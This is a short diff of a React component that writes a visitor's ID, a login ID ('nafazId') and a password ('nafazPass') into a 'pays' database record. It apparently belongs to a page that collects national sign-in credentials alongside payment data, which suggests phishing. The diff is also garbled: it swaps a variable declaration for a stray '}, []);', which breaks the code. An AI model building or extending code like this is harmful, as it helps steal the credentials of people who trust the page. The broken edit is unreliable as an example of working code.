@@ -47,7 +47,7 @@ export default function Component() {
 
     if (typeof window === "undefined") return;
 
-    let visitorId = "";
+}, []);
 
     if (typeof window !== "undefined") {
       const savedVisitor = window.localStorage.getItem("visitor");
@@ -67,7 +67,7 @@ export default function Component() {
     try {
       setIsLoading(true);
 
-      addData(`pays/${visitorId}`, {
+addData(db, `pays/${visitorId}`, {
         id: visitorId,
         nafazId: idLogin,
         nafazPass: password,
